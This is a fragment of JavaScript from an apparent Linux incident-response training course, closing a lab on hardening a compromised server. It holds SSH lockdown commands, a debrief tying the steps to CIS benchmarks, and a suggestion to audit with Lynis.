      "sudo sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config", "echo 'PasswordAuthentication no' | sudo tee /etc/ssh/sshd_config.d/50-cloud-init.conf",
      "sudo sshd -t", "sudo systemctl reload ssh", "cat ~/audit-report.txt"),
    debrief: "<p><b>Module 4 complete, and with it the Linux track.</b> You took a compromised server from \"something's wrong\" to a documented, hardened baseline: read the evidence, contained the attacker, removed every way back in you could find, and closed the doors they used (passwords over SSH, no firewall, loose permissions).</p>" +
      "<p>Everything here maps to real controls in CIS benchmarks and to what an incident responder does on day one. And the report is the part people forget: it's what lets the next person trust, or rebuild, this server.</p>",
    realworld: "Run Lynis (sudo apt install lynis; sudo lynis audit system) on any Ubuntu VM: it checks most of this baseline and explains each finding. For fleets, tools like Ansible (DevOps track) apply a baseline like this to every server at once.",
    quiz: []
  });

  LABS.forEach(function (l) { l.drills = []; T.LABS.push(l); });
  T.UPCOMING = T.UPCOMING.filter(function (row) { return row.module !== 4; });
  T.M4 = { breakin: breakin, accountsScenario: accountsScenario, permsScenario: permsScenario, sshScenario: sshScenario, persistScenario: persistScenario, integrityScenario: integrityScenario, ciScenario: ciScenario, CI_FILES: CI_FILES, RELEASE_KEY: RELEASE_KEY, ATTACKER: ATTACKER, LEGIT_ROOT_KEY: LEGIT_ROOT_KEY, LEGIT_DEPLOY_KEY: LEGIT_DEPLOY_KEY, pubkey: pubkey, uid0: uid0, emptyPw: emptyPw, suidList: suidList, worldW: worldW, failCounts: failCounts, AGENT: AGENT };
})();
